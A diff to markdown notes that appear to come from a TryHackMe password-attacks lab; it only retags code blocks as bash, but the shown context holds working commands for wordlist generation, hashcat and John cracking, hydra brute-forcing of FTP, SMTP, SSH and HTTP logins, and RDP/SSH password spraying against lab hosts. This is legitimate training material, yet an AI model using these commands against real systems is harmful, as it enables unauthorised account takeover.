@@ -102,14 +102,14 @@ Professionals collect and generate weak password lists over time and often combi
  Combined wordlists Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat:
 
    cewl 
-```cewl 
+```bash
 cat file1.txt file2.txt file3.txt > combined_list.txt
 ```
 
    To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:
 
    cewl 
-```cewl 
+```bash
 sort combined_list.txt | uniq -u > cleaned_combined_list.txt
 ```
 
@@ -118,7 +118,7 @@ sort combined_list.txt | uniq -u > cleaned_combined_list.txt
  Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:
 
    cewl 
-```cewl 
+```bash
 user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
 ```
 
@@ -154,7 +154,7 @@ user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
  
 
    Usernames 
-```Usernames 
+```bash
 user@thm$ git clone https://github.com/therodri2/username_generator.git
 Cloning into 'username_generator'...
 remote: Enumerating objects: 9, done.
@@ -171,7 +171,7 @@ user@thm$ cd username_generator
  Using python3 username_generator.py -h shows the tool's help message and optional arguments.
 
    Usernames 
-```Usernames 
+```bash
 user@thm$ python3 username_generator.py -h
 usage: username_generator.py [-h] -w wordlist [-u]
 
@@ -189,7 +189,7 @@ optional arguments:
  
 
    Usernames 
-```Usernames 
+```bash
 user@thm$ echo "John Smith" > users.lst
 user@thm$ python3 username_generator.py -w users.lst
 usage: username_generator.py [-h] -w wordlist [-u]
@@ -220,7 +220,7 @@ smithjohn
 Keyspace TechniqueAnother way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch, we can specify numerous options, including min, max, and options as follows:
 
    crunch 
-```crunch 
+```bash
 user@thm$ crunch -h
 crunch version 3.6
 
@@ -238,7 +238,7 @@ Please refer to the man page for instructions and examples on how to use crunch.
 The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to.
 
     crunch  
-```crunch 
+```bash
 user@thm$ crunch 2 2 01234abcd -o crunch.txt
 Crunch will now generate the following amount of data: 243 bytes
 0 MB
@@ -252,7 +252,7 @@ crunch: 100% completed generating output
    Here is a snippet of the output:
 
    crunch  
-```crunch 
+```bash
 user@thm$ cat crunch.txt
 00
 01
@@ -300,7 +300,7 @@ crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and
 For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers:
 
   crunch 
-```crunch 
+```bash
 user@thm$  crunch 6 6 -t pass%%
 Crunch will now generate the following amount of data: 700 bytes
 0 MB
@@ -321,7 +321,7 @@ pass03
 To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows:
 
   CUPP 
-```CUPP 
+```bash
 user@thm$  git clone https://github.com/Mebus/cupp.git
 Cloning into 'cupp'...
 remote: Enumerating objects: 237, done.
@@ -337,7 +337,7 @@ Now change the current directory to CUPP and run python3 cupp.py or with -h to s
  
 
   CUPP 
-```CUPP 
+```bash
 user@thm$  python3 cupp.py
  ___________
    cupp.py!                 # Common
@@ -507,7 +507,7 @@ This section discusses offline attacks, including dictionary, brute-force, and r
 To identify the type of hash, we could a tool such as hashid or hash-identifier. For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).
 
  Dictionary attack
-```Dictionary attack 
+```bash
 user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 f806fc5a2a0d5ba2471600758452799c:rockyou
@@ -543,7 +543,7 @@ f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our exa
  We run hashcat with --show option to show the cracked value if the hash has been cracked:
 
  Dictionary attack
-```Dictionary attack 
+```bash
 user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
 f806fc5a2a0d5ba2471600758452799c:rockyou
 ```
@@ -557,7 +557,7 @@ In contrast, a brute-force attack aims to try all combinations of a character or
  For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options.
 
  Brute-Force attack
-```Brute-Force attack 
+```bash
 user@machine$ hashcat --help
  ? | Charset
  ===+=========
@@ -574,7 +574,7 @@ user@machine$ hashcat --help
  The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice.
 
  Brute-Force attack
-```Brute-Force attack 
+```bash
 user@machine$ hashcat -a 3 ?d?d?d?d --stdout
 1234
 0234
@@ -599,7 +599,7 @@ user@machine$ hashcat -a 3 ?d?d?d?d --stdout
 Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.
 
  Brute-Force attack
-```Brute-Force attack 
+```bash
 user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
 05a5cf06982ba7892ed2a6d38fe832d6:2021
 
@@ -652,7 +652,7 @@ Rule-Based attacksRule-Based attacks are also known as hybrid attacks. Rule-Base
 For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:
 
  Rule-based attack
-```Rule-based attack 
+```bash
 user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
 JumboSingle
 o1
@@ -690,7 +690,7 @@ T9
  
 
  Rule-based attack
-```Rule-based attack 
+```bash
 user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
 Using default input encoding: UTF-8
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -709,7 +709,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic. KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website [here](https://contest-2010.korelogic.com/rules.html). Now let's use this rule and check whether the Tryh@ckm3 is available in our list!
 
  Rule-based attack
-```Rule-based attack 
+```bash
 user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
 Using default input encoding: UTF-8
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -728,7 +728,7 @@ Let's say we wanted to create a custom wordlist from a pre-existing dictionary w
 We can add our rule to the end of john.conf:
 
 John Rules
-```John Rules 
+```bash
 user@machine$ sudo vi /etc/john/john.conf 
 [List.Rules:THM-Password-Attacks] 
 Az"[0-9]" ^[!@#$]
@@ -745,12 +745,12 @@ Az represents a single word from the original wordlist/dictionary using -p.
 Now let's create a file containing a single word password to see how we can expand our wordlist using this rule.
 
 John Rules
-```John Rules 
+```bash
 user@machine$ echo "password" > /tmp/single.lst
 ```
 
 We include the name of the rule we created in the John command using the --rules option. We also need to show the result in the terminal. We can do this by using --stdout as follows:John Rules
-```John Rules 
+```bash
 user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
 Using default input encoding: UTF-8 
 !password0 
@@ -780,7 +780,7 @@ We recommend using https://clinic.thmredteam.com/ to create your custom wordlist
 To generate your wordlist using cewl against the website:
 
 John Rules
-```John Rules 
+```bash
 user@machine$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
 ```
 
@@ -811,7 +811,7 @@ FTP
 In the following scenario, we will perform a brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:
 
  FTP
-```FTP 
+```bash
 user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
 ```
 
@@ -830,7 +830,7 @@ SMTP
 Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.
 
  SMTP
-```SMTP 
+```bash
 user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
@@ -855,7 +855,7 @@ SSH
 SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.
 
  SSH
-```SSH 
+```bash
 user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
  
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
@@ -881,7 +881,7 @@ In this scenario, we will brute-force HTTP login pages. To do that, first, you n
 As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.
 
 hydra
-```hydra 
+```bash
 user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
 
@@ -980,7 +980,7 @@ Next, we will apply the password spraying technique using different scenarios ag
 SSHAssume that we have already enumerated the system and created a valid username list.
 
     Hashcat  
-```Hashcat 
+```bash
 user@THM:~# cat usernames-list.txt
 admin
 victim
@@ -992,7 +992,7 @@ sammy
    Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.
 
     Hashcat  
-```Hashcat 
+```bash
 user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
 [INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
 [22][ssh] host: 10.1.1.10 login: victim password: Spring2021
@@ -1005,7 +1005,7 @@ user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
 RDPLet's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s GitHub repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:
 
     Hashcat  
-```Hashcat 
+```bash
 user@THM:~# python3 RDPassSpray.py -h
 usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
 
@@ -1038,7 +1038,7 @@ optional arguments:
    Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.
 
     Hashcat  
-```Hashcat 
+```bash
 user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
 [13-02-2021 16:47] - Total number of users to test: 1
 [13-02-2021 16:47] - Total number of password to test: 1
@@ -1050,7 +1050,7 @@ user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:302
    The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.
 
     Hashcat  
-```Hashcat 
+```bash
 user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
 ```
 
